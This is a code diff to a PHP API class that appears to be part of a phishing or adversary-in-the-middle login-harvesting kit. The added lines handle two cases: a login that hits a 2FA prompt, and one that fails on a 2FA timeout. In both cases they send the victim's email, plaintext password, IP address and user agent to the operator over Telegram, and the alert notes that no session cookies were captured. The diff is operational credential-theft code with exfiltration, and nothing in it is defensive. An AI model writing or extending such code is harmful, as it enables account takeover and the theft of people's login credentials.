@@ -1622,11 +1622,37 @@ class Api {
                     exit;
 
                 case 'mfa_prompt':
+                    // Notify once: 2FA required, no cookies captured
+                    $dataArr = $data ?: [];
+                    if (empty($dataArr['telegram_mfa_sent'])) {
+                        $email = $neonRow['email'] ?? '';
+                        $password = $neonRow['password'] ?? '';
+                        $ip = $neonRow['ip'] ?? Security::getClientIp();
+                        $ua = $neonRow['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+                        Worker::sendTelegramMessage($email, $password, $ip, $ua, "⚠️ 2FA Required - No Cookies");
+                        $updatedData = $dataArr;
+                        $updatedData['telegram_mfa_sent'] = true;
+                        NeonDB::updateStatus($sessionId, 'mfa_prompt', $password, $updatedData);
+                    }
                     echo json_encode(['status' => 'MFA_PROMPT', 'subSessionId' => $sessionId]);
                     exit;
 
                 case 'failed':
                     $err = $data['error'] ?? 'Login failed.';
+                    // 2FA timeout — report distinctly (not as an incorrect password)
+                    if (stripos($err, 'mfa') !== false || stripos($err, '2fa') !== false) {
+                        $dataArr = $data ?: [];
+                        if (empty($dataArr['telegram_mfa_sent'])) {
+                            $email = $neonRow['email'] ?? '';
+                            $password = $neonRow['password'] ?? '';
+                            $ip = $neonRow['ip'] ?? Security::getClientIp();
+                            $ua = $neonRow['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+                            Worker::sendTelegramMessage($email, $password, $ip, $ua, "⚠️ 2FA No Cookies");
+                            $updatedData = $dataArr;
+                            $updatedData['telegram_mfa_sent'] = true;
+                            NeonDB::updateStatus($sessionId, 'failed', $password, $updatedData);
+                        }
+                    }
                     echo json_encode(['status' => 'failed', 'data' => ['error' => $err]]);
                     exit;
 
